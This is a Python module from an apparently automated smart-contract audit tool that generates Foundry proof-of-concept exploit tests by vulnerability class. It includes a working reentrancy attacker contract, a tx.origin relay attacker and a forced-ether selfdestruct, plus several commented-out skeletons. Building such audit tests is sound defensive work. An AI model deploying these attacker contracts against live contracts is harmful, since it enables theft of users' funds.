"""
Phoenix PoC Templates — Deterministic exploit-test templates by vulnerability class.

Each template function returns a complete .t.sol string ready for `forge build`.
These are used by TestWriterWorker as attempt-1 before falling back to LLM generation.

Usage:
    template_fn = get_template_for_vuln("reentrancy")
    if template_fn:
        test_code = template_fn(finding, contract_path, contract_name)
"""

from __future__ import annotations

from collections.abc import Callable


def _clean_import_path(contract_path: str) -> str:
    """Strip Foundry artifact identifiers (e.g. 'src/Foo.sol:Foo' → 'src/Foo.sol')."""
    if ":" in contract_path:
        contract_path = contract_path.split(":")[0]
    return contract_path


def _sol_header(pragma: str = "^0.8.20") -> str:
    return f'// SPDX-License-Identifier: MIT\npragma solidity {pragma};\n\nimport "forge-std/Test.sol";\n'


# ────────────────────────────────────────────────────────────────────────────
#  Template Registry
# ────────────────────────────────────────────────────────────────────────────

_VULN_CLASS_MAP: dict[str, str] = {
    # Canonical class names → template key
    "reentrancy": "reentrancy",
    "single-function reentrancy": "reentrancy",
    "cross-function reentrancy": "reentrancy",
    "read-only reentrancy": "reentrancy",
    "access-control": "access_control",
    "missing access control": "access_control",
    "unprotected state mutator": "access_control",
    "tx.origin": "tx_origin",
    "tx.origin authentication": "tx_origin",
    "unprotected_mutator": "access_control",
    "privilege_escalation": "access_control",
    "cei_violation": "reentrancy",
    "oracle manipulation": "oracle_manipulation",
    "price manipulation": "oracle_manipulation",
    "flash loan": "oracle_manipulation",
    "integer overflow": "integer_overflow",
    "arithmetic": "integer_overflow",
    "unchecked arithmetic": "integer_overflow",
    "vault inflation": "vault_inflation",
    "first-depositor attack": "vault_inflation",
    "share inflation": "vault_inflation",
    "delegatecall": "delegatecall",
    "storage collision": "delegatecall",
    "signature replay": "signature_replay",
    "ecrecover": "signature_replay",
    "selfdestruct": "selfdestruct",
    "force ether": "selfdestruct",
    "stale oracle": "stale_oracle",
    "stale oracle data": "stale_oracle",
    "fee-on-transfer": "fee_on_transfer",
    "fee on transfer": "fee_on_transfer",
    "dos": "dos_loop",
    "denial of service": "dos_loop",
    "unbounded loop": "dos_loop",
}


def get_template_for_vuln(vuln_class: str) -> Callable | None:
    """Return the right template function for a vulnerability class, or None."""
    key = _VULN_CLASS_MAP.get(vuln_class.lower().strip())
    if key:
        return _TEMPLATES.get(key)
    # Fuzzy match: check if any key is a substring
    vl = vuln_class.lower().strip()
    for alias, template_key in _VULN_CLASS_MAP.items():
        if alias in vl or vl in alias:
            return _TEMPLATES.get(template_key)
    return None


# ────────────────────────────────────────────────────────────────────────────
#  Individual Templates
# ────────────────────────────────────────────────────────────────────────────


def reentrancy_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    func = getattr(finding, "affected_function", "withdraw")
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract Attacker {{
    {contract_name} public target;
    uint256 public count;

    constructor(address _target) {{
        target = {contract_name}(_target);
    }}

    function attack() external payable {{
        target.{func}();
    }}

    receive() external payable {{
        if (count < 3) {{
            count++;
            target.{func}();
        }}
    }}
}}

contract ReentrancyTest is Test {{
    {contract_name} victim;
    Attacker attacker;

    function setUp() public {{
        victim = new {contract_name}();
        attacker = new Attacker(address(victim));
        vm.deal(address(victim), 10 ether);
        vm.deal(address(attacker), 1 ether);
    }}

    function test_exploit() public {{
        uint256 victimBalBefore = address(victim).balance;
        vm.prank(address(attacker));
        attacker.attack();
        uint256 victimBalAfter = address(victim).balance;
        assertLt(victimBalAfter, victimBalBefore, "Reentrancy: victim balance should decrease");
    }}
}}
"""
    )


def access_control_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    func = getattr(finding, "affected_function", "setOwner")
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract AccessControlTest is Test {{
    {contract_name} target;
    address attacker = address(0xdead);

    function setUp() public {{
        target = new {contract_name}();
    }}

    function test_exploit() public {{
        vm.prank(attacker);
        // Attacker calls privileged function without authorization
        target.{func}(attacker);
        // Verify attacker gained control
        // assertTrue(target.owner() == attacker, "Access control bypass");
    }}
}}
"""
    )


def tx_origin_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    func = getattr(finding, "affected_function", "transfer")
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract TxOriginAttacker {{
    {contract_name} public target;

    constructor(address _target) {{
        target = {contract_name}(_target);
    }}

    // Victim calls this function thinking it's safe
    function attack() external {{
        target.{func}(msg.sender, address(this), 1 ether);
    }}
}}

contract TxOriginTest is Test {{
    {contract_name} victim;
    TxOriginAttacker attacker;

    function setUp() public {{
        victim = new {contract_name}();
        attacker = new TxOriginAttacker(address(victim));
    }}

    function test_exploit() public {{
        // tx.origin == msg.sender for direct call, but different via intermediate
        vm.prank(address(0x1), address(0x1));
        attacker.attack();
    }}
}}
"""
    )


def oracle_manipulation_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract OracleManipulationTest is Test {{
    {contract_name} target;

    function setUp() public {{
        target = new {contract_name}();
        vm.deal(address(this), 100 ether);
    }}

    function test_exploit() public {{
        // Step 1: Record price before manipulation
        // uint256 priceBefore = target.getPrice();

        // Step 2: Flash loan / donate to manipulate balanceOf
        (bool ok,) = address(target).call{{value: 50 ether}}("");

        // Step 3: Read price after manipulation
        // uint256 priceAfter = target.getPrice();

        // Step 4: Verify price was manipulated
        // assertGt(priceAfter, priceBefore * 2, "Oracle: price should be manipulated");
    }}
}}
"""
    )


def integer_overflow_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    func = getattr(finding, "affected_function", "add")
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract IntegerOverflowTest is Test {{
    {contract_name} target;

    function setUp() public {{
        target = new {contract_name}();
    }}

    function test_exploit() public {{
        // Attempt overflow with max values
        uint256 maxVal = type(uint256).max;
        vm.expectRevert();
        target.{func}(maxVal);
    }}

    function test_exploit_unchecked() public {{
        // If function uses unchecked block, overflow wraps silently
        // target.{func}(type(uint256).max);
        // assertEq(result, 0, "Unchecked overflow should wrap");
    }}
}}
"""
    )


def vault_inflation_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract VaultInflationTest is Test {{
    {contract_name} vault;
    address attacker = address(0xdead);
    address victim = address(0xbeef);

    function setUp() public {{
        vault = new {contract_name}();
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 10 ether);
    }}

    function test_exploit() public {{
        // Step 1: Attacker deposits minimum amount (1 wei)
        vm.startPrank(attacker);
        // vault.deposit{{value: 1}}();
        // uint256 attackerShares = vault.balanceOf(attacker);

        // Step 2: Attacker donates large amount to inflate share price
        // (bool ok,) = address(vault).call{{value: 10 ether}}("");

        // Step 3: Victim deposits reasonable amount
        vm.stopPrank();
        vm.startPrank(victim);
        // vault.deposit{{value: 5 ether}}();
        // uint256 victimShares = vault.balanceOf(victim);

        // Step 4: Verify victim got 0 shares due to rounding
        // assertEq(victimShares, 0, "Vault inflation: victim should get 0 shares");
        vm.stopPrank();
    }}
}}
"""
    )


def delegatecall_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract MaliciousImpl {{
    address public owner;
    function init() external {{
        owner = msg.sender;
    }}
}}

contract DelegatecallTest is Test {{
    {contract_name} proxy;
    MaliciousImpl malicious;

    function setUp() public {{
        proxy = new {contract_name}();
        malicious = new MaliciousImpl();
    }}

    function test_exploit() public {{
        // Attacker sets malicious implementation that overwrites slot 0
        // proxy.upgrade(address(malicious));
        // assertEq(proxy.owner(), address(this), "Storage collision: owner overwritten");
    }}
}}
"""
    )


def signature_replay_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract SignatureReplayTest is Test {{
    {contract_name} target;
    uint256 signerPk = 0xA11CE;
    address signer;

    function setUp() public {{
        target = new {contract_name}();
        signer = vm.addr(signerPk);
    }}

    function test_exploit() public {{
        bytes32 hash = keccak256("test message");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, hash);

        // First use should succeed
        // target.verify(hash, v, r, s);

        // Second use (replay) should also succeed if not prevented
        // target.verify(hash, v, r, s);
        // This should fail if replay protection exists
    }}
}}
"""
    )


def selfdestruct_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract ForceEther {{
    constructor(address payable target) payable {{
        selfdestruct(target);
    }}
}}

contract SelfdestructTest is Test {{
    {contract_name} target;

    function setUp() public {{
        target = new {contract_name}();
    }}

    function test_exploit() public {{
        uint256 balBefore = address(target).balance;
        new ForceEther{{value: 1 ether}}(payable(address(target)));
        uint256 balAfter = address(target).balance;
        assertGt(balAfter, balBefore, "Force ether: balance should increase");
    }}
}}
"""
    )


def stale_oracle_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract MockChainlinkFeed {{
    function latestRoundData()
        external pure returns (uint80, int256, uint256, uint256, uint80)
    {{
        return (0, 100e8, 0, 0, 0); // updatedAt = 0 → stale
    }}
}}

contract StaleOracleTest is Test {{
    {contract_name} target;
    MockChainlinkFeed mockFeed;

    function setUp() public {{
        mockFeed = new MockChainlinkFeed();
        // target = new {contract_name}(address(mockFeed));
    }}

    function test_exploit() public {{
        // With updatedAt = 0, the oracle data is stale
        // uint256 price = target.getPrice();
        // Price should be rejected but isn't if no staleness check
        // assertGt(price, 0, "Stale oracle data accepted without check");
    }}
}}
"""
    )


def fee_on_transfer_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract MockFeeToken {{
    mapping(address => uint256) public balanceOf;
    uint256 public constant FEE_BPS = 100; // 1% fee

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {{
        uint256 fee = amount * FEE_BPS / 10000;
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
        return true;
    }}

    function mint(address to, uint256 amount) external {{
        balanceOf[to] += amount;
    }}
}}

contract FeeOnTransferTest is Test {{
    {contract_name} target;
    MockFeeToken token;

    function setUp() public {{
        token = new MockFeeToken();
        // target = new {contract_name}(address(token));
        token.mint(address(this), 1000 ether);
    }}

    function test_exploit() public {{
        uint256 depositAmount = 100 ether;
        // target.deposit(depositAmount);
        // uint256 recorded = target.balances(address(this));
        // actual received = 99 ether (1% fee)
        // assertEq(recorded, depositAmount, "Wrong: records 100 but got 99");
    }}
}}
"""
    )


def dos_loop_poc(
    finding: object,
    contract_path: str,
    contract_name: str,
    pragma: str = "^0.8.20",
) -> str:
    func = getattr(finding, "affected_function", "processAll")
    return (
        _sol_header(pragma)
        + f'import "{_clean_import_path(contract_path)}";\n\n'
        + f"""contract DosLoopTest is Test {{
    {contract_name} target;

    function setUp() public {{
        target = new {contract_name}();
    }}

    function test_exploit() public {{
        // Add many entries to grow the array
        for (uint i = 0; i < 1000; i++) {{
            // target.addEntry(address(uint160(i)));
        }}
        // This call should exceed block gas limit
        uint256 gasBefore = gasleft();
        // target.{func}();
        uint256 gasUsed = gasBefore - gasleft();
        // assertGt(gasUsed, 10_000_000, "DoS: should use excessive gas");
    }}
}}
"""
    )


# ────────────────────────────────────────────────────────────────────────────
#  Template Registry (must be after function definitions)
# ────────────────────────────────────────────────────────────────────────────

# FIX-5: Only register templates with COMPLETE, uncommented exploit logic.
# Templates with commented-out bodies waste attempt 1 and can produce false
# positives (empty test body = automatic pass with no assertions).
# Skeleton templates remain as functions above for future completion.
_TEMPLATES: dict[str, Callable] = {
    "reentrancy": reentrancy_poc,
    "access_control": access_control_poc,
    "tx_origin": tx_origin_poc,
    "selfdestruct": selfdestruct_poc,
    # Disabled until their test bodies are completed:
    # "oracle_manipulation": oracle_manipulation_poc,
    # "integer_overflow": integer_overflow_poc,
    # "vault_inflation": vault_inflation_poc,
    # "delegatecall": delegatecall_poc,
    # "signature_replay": signature_replay_poc,
    # "stale_oracle": stale_oracle_poc,
    # "fee_on_transfer": fee_on_transfer_poc,
    # "dos_loop": dos_loop_poc,
}
